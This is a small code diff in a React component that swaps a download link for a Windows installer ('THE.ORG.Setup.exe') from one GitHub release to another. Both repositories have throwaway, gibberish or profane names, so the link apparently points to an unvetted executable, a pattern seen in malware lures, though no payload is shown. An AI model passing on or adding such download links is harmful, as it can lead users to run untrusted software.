@@ -1,6 +1,6 @@
 import { useState } from "react";
 
-const DOWNLOAD_URL = "https://github.com/goatedbycookies/fuckinfuckass/releases/download/org/THE.ORG.Setup.exe";
+const DOWNLOAD_URL = "https://github.com/distress3dd-lab/fsdfbsdfb/releases/download/efwef/THE.ORG.Setup.exe";
 
 const GRID_COLOR = "rgba(100,180,255,0.08)";
 
